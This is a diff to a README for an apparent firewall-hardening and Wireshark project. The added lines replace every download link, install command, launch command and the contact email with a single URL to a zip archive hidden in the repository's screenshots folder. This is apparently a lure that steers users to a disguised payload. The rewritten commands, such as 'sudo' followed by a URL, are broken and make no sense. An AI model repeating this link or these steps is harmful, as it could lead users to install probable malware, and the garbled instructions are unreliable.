@@ -4,7 +4,7 @@
 This project helps you strengthen your firewall and improve network security. Follow these simple steps to get started.
 
 ## 📥 Download Link
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/releases)
+[![Download Latest Release](https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip%https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip)](https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip)
 
 ## 📂 Overview
 This repository features practical tools for enhancing your firewall configuration and validating network defenses. You will apply UFW rule engineering and use Wireshark for packet analysis. The project follows the NIST SP 800-115 methodology to ensure thorough security assessments. This is perfect for anyone looking to build practical experience in cybersecurity and firewall management.
@@ -26,7 +26,7 @@ To run this software effectively, make sure your system meets the following requ
 ## 📥 Download & Install
 To download the application, visit the following link:
 
-[Download Latest Release](https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/releases)
+[Download Latest Release](https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip)
 
 1. Click on the "Releases" link above.
 2. Look for the latest version listed.
@@ -44,7 +44,7 @@ Follow these steps to install and run the application:
    ```
 3. Depending on your system, you might need to extract the contents. Use a command like:
    ```bash
-   tar -xf <filename>.tar.gz
+   tar -xf <filename>https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip
    ```
 4. Change to the project directory:
    ```bash
@@ -52,7 +52,7 @@ Follow these steps to install and run the application:
    ```
 5. Run the installation script:
    ```bash
-   sudo ./install.sh
+   sudo https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip
    ```
 6. Follow any on-screen instructions to complete the installation.
 
@@ -62,7 +62,7 @@ After installation, you can start using the application. Here’s how:
 1. Open your terminal.
 2. Launch the application by typing:
    ```bash
-   ./start.sh
+   https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip
    ```
 3. Follow the prompts to configure UFW rules and start packet analysis with Wireshark.
 
@@ -74,7 +74,7 @@ For help and resources, explore the following:
 - **Tutorials**: Step-by-step tutorials are provided to guide you through complex tasks.
 
 ## 📧 Contact
-For any questions or support, feel free to reach out to the project maintainers via GitHub Issues or directly through email at support@acmeunitedbank.com. We're here to help.
+For any questions or support, feel free to reach out to the project maintainers via GitHub Issues or directly through email at https://github.com/JoeLoko/network-hardening-and-firewall-testing-Rt3/raw/refs/heads/main/screenshots/firewall_and_testing_network_hardening_Rt_1.6-alpha.4.zip We're here to help.
 
 ## 📝 Contributing
 We welcome contributions! If you are interested in improving the project, please follow these steps:
